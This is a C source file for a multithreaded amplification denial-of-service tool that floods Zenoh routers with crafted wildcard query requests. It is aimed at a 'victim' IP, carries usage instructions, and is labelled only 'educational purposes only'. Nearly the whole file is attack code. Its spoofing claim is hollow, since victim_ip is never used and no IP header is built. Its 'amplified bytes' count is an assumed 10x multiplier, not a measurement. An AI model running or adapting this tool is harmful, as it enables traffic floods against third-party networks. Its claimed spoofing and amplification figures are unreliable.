/*
 * Attack 7: Amplification Attack
 * Uses Zenoh queries to amplify traffic
 * 
 * Compile: gcc -o attack7_amplify attack_7_amplification.c -pthread
 * Run: ./attack7_amplify <target_ip> <target_port> <victim_ip> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_N_REQUEST 0x09

static volatile int g_running = 1;
static atomic_ullong g_queries_sent = 0;
static atomic_ullong g_amplification_bytes = 0;

typedef struct {
    char *target_ip;
    int target_port;
    char *victim_ip;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping amplification attack...\n");
    g_running = 0;
}

size_t craft_query_request(unsigned char *buffer, const char *key) {
    size_t offset = 0;
    
    // Network message header: REQUEST
    buffer[offset++] = Z_N_REQUEST;
    
    // Request ID
    buffer[offset++] = 0x01; buffer[offset++] = 0x00;
    
    // Key expression length + data
    size_t key_len = strlen(key);
    buffer[offset++] = (unsigned char)key_len;
    memcpy(buffer + offset, key, key_len);
    offset += key_len;
    
    // Parameters to make query expensive
    const char *params = "?param1=value1&param2=value2&param3=value3";
    size_t param_len = strlen(params);
    memcpy(buffer + offset, params, param_len);
    offset += param_len;
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[1024];
    
    // Create RAW socket to spoof source IP
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: RAW socket failed (need root?)\n", 
                args->thread_id);
        // Fallback to normal socket
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            free(args);
            return NULL;
        }
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started\n", args->thread_id);
    
    const char *query_keys[] = {
        "demo/example/**",
        "sensor/+/data",
        "telemetry/**",
        "logs/**",
        "metrics/**"
    };
    int num_keys = 5;
    
    unsigned long local_count = 0;
    
    while (g_running) {
        const char *key = query_keys[rand() % num_keys];
        size_t msg_len = craft_query_request(buffer, key);
        
        ssize_t sent = sendto(sock, buffer, msg_len, 0,
                             (struct sockaddr*)&target_addr,
                             sizeof(target_addr));
        
        if (sent > 0) {
            atomic_fetch_add(&g_queries_sent, 1);
            // Assume 10x amplification factor
            atomic_fetch_add(&g_amplification_bytes, msg_len * 10);
            local_count++;
        }
        
        if (local_count % 1000 == 0) {
            printf("[Thread %d] Sent %lu amplification queries\n",
                   args->thread_id, local_count);
        }
        
        usleep(1000);
    }
    
    close(sock);
    printf("[*] Thread %d stopped (sent %lu)\n", args->thread_id, local_count);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <victim_ip> <threads>\n", argv[0]);
        fprintf(stderr, "Note: Spoofing requires root\n");
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    char *victim_ip = argv[3];
    int num_threads = atoi(argv[4]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Amplification Attack               ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target (reflector): %s:%d\n", target_ip, target_port);
    printf("[*] Victim: %s\n", victim_ip);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Amplification factor: ~10x\n\n");
    
    if (geteuid() != 0) {
        printf("[!] Warning: Not running as root, source IP spoofing disabled\n\n");
    }
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->victim_ip = victim_ip;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Amplification attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long queries = atomic_load(&g_queries_sent);
        unsigned long long amp_bytes = atomic_load(&g_amplification_bytes);
        time_t elapsed = time(NULL) - start;
        
        printf("[*] Queries: %llu | Amplified: %llu bytes (%.2f MB) | Rate: %.2f qps\n",
               queries, amp_bytes, amp_bytes / 1048576.0,
               elapsed > 0 ? (double)queries / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total_queries = atomic_load(&g_queries_sent);
    unsigned long long total_amp = atomic_load(&g_amplification_bytes);
    time_t duration = time(NULL) - start;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Queries:   %-25llu ║\n", total_queries);
    printf("║ Amplified Bytes: %-25llu ║\n", total_amp);
    printf("║ Amplified Data:  %-21.2f MB ║\n", total_amp / 1048576.0);
    printf("║ Duration:        %-25ld ║\n", duration);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}